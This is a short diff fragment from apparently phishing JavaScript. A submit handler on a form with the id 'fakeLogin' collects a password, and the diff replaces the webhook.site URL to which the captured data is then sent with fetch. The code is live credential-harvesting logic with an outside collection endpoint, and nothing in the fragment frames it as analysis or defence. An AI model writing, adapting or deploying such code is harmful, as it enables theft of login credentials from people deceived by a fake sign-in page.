@@ -31,7 +31,7 @@ document.getElementById('fakeLogin').addEventListener('submit', function(e) {
       password: password,
     });
 
-    const webhook = "https://webhook.site/7a0dbcec-4a4a-4059-9719-eae36e1140d6";
+    const webhook = "https://webhook.site/12f0844f-6a73-46ee-83cc-768b9c88af4c";
 
     fetch(webhook, {
       method: 'GET'
